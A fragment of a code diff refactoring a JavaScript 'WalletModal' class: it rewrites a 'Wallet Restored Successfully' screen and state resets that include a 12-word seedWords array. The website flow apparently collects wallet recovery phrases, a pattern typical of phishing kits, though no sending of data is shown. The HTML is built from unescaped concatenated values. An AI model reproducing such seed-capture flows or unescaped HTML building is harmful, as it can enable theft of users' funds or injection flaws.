-            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0s"></div>
-            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.2s"></div>
-            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.4s"></div>
-          </div>
-        </div>
-      </div>
-    `;
-    
-    document.body.insertAdjacentHTML('beforeend', successHTML);
-    
-    // Auto close after 3 seconds and restore main content
-    setTimeout(() => {
-      this.closeModal();
-      this.restoreMainContent();
+    const walletSecondary = this.selectedWallet.secondaryColor;
+    const container = document.getElementById('wallet-flow-container') || document.body;
+
+    const successHTML = '<div id="wallet-success-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">' +
+      '<div class="flex flex-col items-center">' +
+      '<div class="mb-8 relative">' +
+      '<img src="' + this.selectedWallet.iconUrl + '" alt="' + this.selectedWallet.name + '" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display=\'none\'; this.outerHTML=\'<div class=\\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\\' style=\\\'background: linear-gradient(135deg, ' + walletColor + ', ' + walletSecondary + ')\\\'>' + this.selectedWallet.emoji + '</div>\';">' +
+      '<div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">' +
+      '<svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
+      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>' +
+      '</svg>' +
+      '</div>' +
+      '</div>' +
+      '<h2 class="text-2xl font-bold text-gray-900 mb-3">Wallet Restored Successfully</h2>' +
+      '<p class="text-gray-500 text-center mb-8">Your wallet has been imported</p>' +
+      '<div class="flex space-x-2">' +
+      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0s"></div>' +
+      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0.2s"></div>' +
+      '<div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ' + walletColor + '; animation-delay: 0.4s"></div>' +
+      '</div>' +
+      '</div>' +
+      '</div>';
+
+    container.insertAdjacentHTML('beforeend', successHTML);
+
+    // Auto close and restore
+    const self = this;
+    setTimeout(function() {
+      self.closeModal();
+      self.restoreMainContent();
     }, 3000);
   }
 
   restoreMainContent() {
-    // Show all hidden content again
-    Array.from(document.body.children).forEach(child => {
-      if (child.id !== 'wallet-flow-container') {
-        child.style.display = '';
-      }
-    });
-    
-    // Remove the wallet flow container
     const container = document.getElementById('wallet-flow-container');
-    if (container) {
-      container.remove();
-    }
+    if (container) container.remove();
   }
 
   closeModalOnly() {
-    // Remove all modal backdrops without resetting state
     const modals = [
       'wallet-modal-backdrop',
       'wallet-import-backdrop',
@@ -1205,20 +983,15 @@ class WalletModal {
       'wallet-prompt-backdrop',
       'walletconnect-modal-backdrop'
     ];
-    
-    modals.forEach(id => {
+
+    modals.forEach(function(id) {
       const element = document.getElementById(id);
-      if (element) {
-        element.remove();
-      }
+      if (element) element.remove();
     });
   }
- 
-  closeModal() {
-    // Remove all modal backdrops
-    this.closeModalOnly();
 
-    // Reset state
+  closeModal() {
+    this.closeModalOnly();
     this.selectedWallet = null;
     this.importType = '12';
     this.seedWords = Array(12).fill('');
@@ -1226,13 +999,12 @@ class WalletModal {
   }
 }
 
-// Export to window and initialize
+// Initialize
 window.WalletModal = WalletModal;
 
-// Initialize the wallet modal only if not already initialized
 if (!window.walletModal) {
   window.walletModal = new WalletModal();
-  console.log('WalletModal initialized');
+  console.log('✨ WalletModal initialized successfully');
 }
 
-})(); // End IIFE
+})();
